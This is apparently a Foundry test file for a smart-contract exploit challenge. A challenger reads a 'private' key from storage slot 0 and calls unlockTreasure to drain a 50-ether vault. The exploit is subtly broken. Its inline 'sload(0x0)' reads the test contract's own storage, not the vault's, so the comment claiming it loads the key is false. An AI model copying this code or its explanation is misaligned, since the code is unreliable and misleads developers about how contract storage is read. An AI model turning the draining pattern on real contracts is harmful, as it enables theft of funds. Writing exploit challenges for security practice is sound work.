// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {PrivateTreasure} from "src/exploits/private-treasure/PrivateTreasure.sol";
import {console} from "forge-std/console.sol";

contract PrivateTreasureTest is Test {
    PrivateTreasure public contractUnderTest;
    address public challenger = vm.addr(1);

    function setUp() public {
        uint256 initialKey = 1234;
        contractUnderTest = new PrivateTreasure(initialKey);
        vm.deal(address(contractUnderTest), 50 ether);
        vm.deal(challenger, 1 ether);
    }

    function testPreCheck() public view {
        assertEq(address(contractUnderTest).balance, 50 ether, "Contract balance should be 50 ether");
        assertEq(address(challenger).balance, 1 ether, "Challenger balance should be 1 ether");
    }

    function testStealFundsFromVault() public {
        vm.startPrank(challenger);

        uint256 startingBalance = address(challenger).balance;
        uint256 vaultBalance = address(contractUnderTest).balance;
        
        // Extract the key from the contract's storage
        uint256 key;
        assembly {
            key := sload(0x0) // Load the value stored at slot 0 (the key)
        }

        console.log("Key: %d", key);

        contractUnderTest.unlockTreasure(key);

        assertEq(address(challenger).balance, vaultBalance + startingBalance, "Challenger should have stolen all funds");
        assertEq(address(contractUnderTest).balance, 0, "Contract balance should be 0 after theft");
    }
}
